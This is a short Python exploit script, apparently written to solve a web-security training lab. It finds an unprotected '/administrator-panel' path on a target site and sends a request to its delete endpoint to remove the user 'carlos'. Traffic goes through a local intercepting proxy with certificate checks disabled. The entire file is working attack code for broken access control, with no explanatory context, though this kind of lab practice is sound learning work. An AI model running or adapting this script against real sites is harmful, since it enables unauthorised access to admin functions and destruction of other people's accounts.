import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }


def deleteuser(url):
    admin_panel_url = url + '/administrator-panel'
    r = requests.get(admin_panel_url , verify=False, proxies=proxies )
    if r.status_code==200:
        print("[+] Admin panel var")
        print("[+] Carlos Delete")
        delete_user = admin_panel_url+ '/delete?username=carlos'
        r = requests.get(delete_user , verify=False, proxies=proxies )
        if r.status_code==200:
             print("[+] Carlos Delete Completed")
        else:
             print("[-] Carlos Delete Error")
    else:
           print("[-] Admin panel yok")

if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
    url = sys.argv[1]
    print("[+] Admin panel arıyorum.......")
    deleteuser(url)


        
